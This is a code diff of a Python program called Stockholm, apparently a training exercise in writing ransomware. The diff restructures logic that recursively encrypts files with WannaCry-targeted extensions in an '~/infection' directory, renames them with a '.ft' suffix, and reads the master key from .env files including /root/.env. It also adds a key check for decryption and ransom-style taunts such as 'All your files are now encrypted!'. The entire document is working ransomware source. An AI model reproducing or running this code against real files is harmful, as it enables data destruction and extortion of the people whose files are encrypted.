@@ -4,8 +4,6 @@ import sys
 import base64
 from dotenv import load_dotenv
 from nacl.secret import SecretBox
-from nacl.utils import random
-from nacl.exceptions import CryptoError
 
 Args = argparse.Namespace
 Parser = argparse.ArgumentParser
@@ -21,7 +19,6 @@ HEADER = """
     !:!     :!:    :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!   :!:      :!:     :!:  
 :::: ::      ::    ::::: ::   ::: :::   ::  :::  ::   :::  ::::: ::   :: ::::  :::     ::   
 :: : :       :      : :  :    :: :: :   :   :::   :   : :   : :  :   : :: : :   :      :    
-                                                                                            
     """
 
 
@@ -67,11 +64,15 @@ def get_master_key() -> str:
     key = os.getenv("MASTER_KEY")
     if key:
         return key
+    load_dotenv("/root/.env")
+    key = os.getenv("MASTER_KEY")
+    if key:
+        return key
     load_dotenv("../.env")
     key = os.getenv("MASTER_KEY")
     if key:
         return key
-    load_dotenv("/root/.env")
+    load_dotenv(".env")
     key = os.getenv("MASTER_KEY")
     if not key:
         raise ValueError("MASTER_KEY not found in .env file")
@@ -107,54 +108,71 @@ class Stockholm:
             master_key.encode().ljust(24, b"\0")
         ).decode()
         self.box = SecretBox(self.master_key_b64.encode())
+        self.target_directory = os.path.expanduser("~/infection")
 
     def encrypt(self):
-        path = os.path.expanduser("~/infection")
+        if not os.path.exists(self.target_directory):
+            self.target_directory = "../infection"
+            if not os.path.exists(self.target_directory):
+                self.target_directory = "./infection"
+                if not os.path.exists(self.target_directory):
+                    raise ValueError("Target directory not found")
 
-        if not os.path.exists(path):
-            path = "../infection"
-            if not os.path.exists(path):
-                raise ValueError("Target directory not found")
-
-        for root, dirs, files in os.walk(path):
-            for file in files:
-                if file.endswith(tuple(wannacry_extensions)):
-                    file_path = os.path.join(root, file)
-                    print(f"{Color.WARNING}Encrypting {file_path}...{Color.RESET}")
-
-                    with open(file_path, "r+b") as f:
-                        data = f.read()
-                        encrypted_data = self.box.encrypt(data)
-
-                        f.seek(0)
-                        f.write(encrypted_data)
-                        f.truncate()
-
-                    if not file_path.endswith(".ft"):
-                        os.rename(file_path, file_path + ".ft")
+        self._process_directory(self.target_directory, encrypt=True)
 
     def decrypt(self):
-        path = os.path.expanduser("~/infection")
+        if not os.path.exists(self.target_directory):
+            self.target_directory = "../infection"
+            if not os.path.exists(self.target_directory):
+                self.target_directory = "./infection"
+                if not os.path.exists(self.target_directory):
+                    raise ValueError("Target directory not found")
 
-        if not os.path.exists(path):
-            path = "../infection"
-            if not os.path.exists(path):
-                raise ValueError("Target directory not found")
+        self._process_directory(self.target_directory, encrypt=False)
 
-        for root, dirs, files in os.walk(path):
-            for file in files:
-                if file.endswith(".ft"):
-                    file_path = os.path.join(root, file)
-                    print(f"{Color.SUCCESS}Decrypting {file_path}...{Color.RESET}")
+    def _process_directory(self, directory, encrypt: bool):
+        for entry in os.scandir(directory):
+            if entry.is_file():
+                if encrypt:
+                    self._encrypt_file(entry.path)
+                else:
+                    self._decrypt_file(entry.path)
+            elif entry.is_dir():
+                self._process_directory(entry.path, encrypt)
 
-                    with open(file_path, "rb") as f:
-                        encrypted_data = f.read()
-                        decrypted_data = self.box.decrypt(encrypted_data)
+    def _encrypt_file(self, file_path: str):
+        if not file_path.endswith(tuple(wannacry_extensions)):
+            return
 
-                    with open(file_path, "wb") as f:
-                        f.write(decrypted_data)
+        print(f"{Color.WARNING}Encrypting {file_path}...{Color.RESET}")
 
-                    os.rename(file_path, file_path[:-3])
+        with open(file_path, "r+b") as f:
+            data = f.read()
+            encrypted_data = self.box.encrypt(data)
+            f.seek(0)
+            f.write(encrypted_data)
+            f.truncate()
+        if not file_path.endswith(".ft"):
+            os.rename(file_path, file_path + ".ft")
+
+    def _decrypt_file(self, file_path: str):
+        if not file_path.endswith(".ft"):
+            return
+
+        print(f"{Color.SUCCESS}Decrypting {file_path}...{Color.RESET}")
+
+        with open(file_path, "r+b") as f:
+            encrypted_data = f.read()
+            decrypted_data = self.box.decrypt(encrypted_data)
+            f.seek(0)
+            f.write(decrypted_data)
+            f.truncate()
+        os.rename(file_path, file_path[:-3])
+
+    def _validate_key(self, key: str) -> bool:
+        if key == self.master_key_b64:
+            return True
+        return False
 
 
 def main() -> None:
@@ -166,9 +184,16 @@ def main() -> None:
         print_header()
         stockholm = Stockholm(master_key)
         if args.reverse:
-            stockholm.decrypt()
+            if stockholm._validate_key(args.reverse):
+                stockholm.decrypt()
+                print(f"{Color.SUCCESS}\n😇😇😇 You are free now! 😇😇😇{Color.RESET}")
+            else:
+                print(
+                    f"{Color.ERROR}😈😈😈 Invalid key: Good luck next time! 😈😈😈{Color.RESET}"
+                )
         else:
             stockholm.encrypt()
+            print("\n😈😈😈 All your files are now encrypted! 😈😈😈")
     except Exception as e:
         print(f"{Color.ERROR}Error: {e}{Color.RESET}")
 
